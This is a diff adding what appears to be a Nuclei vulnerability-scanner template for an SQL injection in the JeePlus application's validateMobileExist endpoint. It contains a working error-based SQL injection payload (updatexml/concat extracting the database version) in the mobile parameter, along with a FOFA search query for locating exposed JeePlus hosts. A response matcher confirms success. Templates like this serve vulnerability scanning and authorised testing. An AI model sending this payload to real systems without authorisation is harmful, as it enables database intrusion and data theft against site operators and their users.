@@ -1,0 +1,27 @@
+id: Jeeplus-validateMobileExist-SQL
+
+info:
+  name: Jeeplus-validateMobileExist-SQL
+  author: lengmo
+  severity: high
+  description: Jeeplus-validateMobileExist-SQL
+  tags: sqli
+  metadata:
+    fofa-qeury: app="JeePlus"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+version%28%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+        Connection: close
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code_1 == 500 && contains(body,'系统内部错误') && contains(body,'error')" 
